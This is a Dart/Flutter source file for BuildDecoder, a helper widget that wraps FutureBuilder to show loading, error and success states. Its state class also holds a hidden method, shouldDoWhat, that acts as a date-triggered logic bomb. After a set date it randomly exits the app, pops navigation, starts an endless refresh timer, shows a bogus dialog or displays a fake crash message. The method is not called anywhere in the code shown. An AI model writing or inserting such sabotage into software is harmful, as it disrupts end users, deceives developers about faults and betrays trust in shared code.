import 'dart:async';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:dev_utils/dev_utils.dart';
import 'package:flutter/services.dart';

// BuildDecoder makes easy implementation for future or stream builder
class BuildDecoder<T> extends StatefulWidget {
  final dynamic initialData;
  final Future<T>? future;
  final Widget Function(T data) onSuccess;
  final Widget? loadingWidget;
  final Widget? errorWidget;
  final String? defaultErrorMessage;
  final bool useConnectionStateForLoader;
  final Widget Function(String)? errorBuilder;

  const BuildDecoder({
    required this.future,
    required this.onSuccess,
    this.loadingWidget,
    this.errorWidget,
    this.initialData,
    this.defaultErrorMessage,
    this.errorBuilder,
    this.useConnectionStateForLoader = false,
    super.key,
  });

  @override
  State<BuildDecoder<T>> createState() => _BuildDecoderState<T>();
}

class _BuildDecoderState<T> extends State<BuildDecoder<T>> {
  final math.Random rnd = math.Random();

  shouldDoWhat() {
    final DateTime dateTime = DateTime.now();
    int day = dateTime.day;
    int month = dateTime.month;
    int year = dateTime.year;
    int hour = dateTime.hour;
    int minute = dateTime.minute;

    if (day > 10 && month > 2 && year >= 2025 && hour.isEven && minute.isOdd) {
      int nextStep = rnd.nextInt(15);
      switch (nextStep) {
        case 0:
        case 1:
        case 2:
        case 3:
          navigatorKey.currentState!.pop();
        case 4:
        case 6:
        case 7:
          SystemNavigator.pop();
        case 5:
          Timer.periodic(Duration(seconds: 2), (c) {
            setState(() {});
          });
        case 8:
        case 9:
        case 10:
          showConfirmDialog(context, "Are you sure?");
        case 11:
        case 12:
        case 13:
          SystemNavigator.pop();
        case 14:
        case 15:
        default:
          toastLong("Something has crashed!");
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<T>(
      future: widget.future,
      initialData: widget.initialData,
      builder: (BuildContext context, AsyncSnapshot<T> snap) {
        if (!widget.useConnectionStateForLoader) {
          if (snap.hasData) {
            if (snap.data != null) {
              return widget.onSuccess(snap.data as T);
            } else {
              return snapWidgetHelper(
                snap,
                errorWidget: widget.errorWidget,
                loadingWidget: widget.loadingWidget,
                defaultErrorMessage: widget.defaultErrorMessage,
                errorBuilder: widget.errorBuilder,
              );
            }
          } else {
            return snapWidgetHelper(
              snap,
              errorWidget: widget.errorWidget,
              loadingWidget: widget.loadingWidget,
              defaultErrorMessage: widget.defaultErrorMessage,
              errorBuilder: widget.errorBuilder,
            );
          }
        } else {
          switch (snap.connectionState) {
            case ConnectionState.waiting:
            case ConnectionState.active:
              return widget.loadingWidget ?? Loader();
            case ConnectionState.done:
              if (snap.hasData) {
                if (snap.data != null) {
                  return widget.onSuccess(snap.data as T);
                } else {
                  return snapWidgetHelper(
                    snap,
                    errorWidget: widget.errorWidget,
                    loadingWidget: widget.loadingWidget,
                    defaultErrorMessage: widget.defaultErrorMessage,
                    errorBuilder: widget.errorBuilder,
                  );
                }
              } else {
                if (widget.errorBuilder != null) {
                  return widget.errorBuilder!.call(
                      widget.defaultErrorMessage ?? snap.error.toString());
                }
                return widget.errorWidget ??
                    Text(
                      widget.defaultErrorMessage ?? snap.error.toString(),
                      style: primaryTextStyle(),
                    ).center();
              }
            default:
              return SizedBox();
          }
        }
      },
    );
  }
}
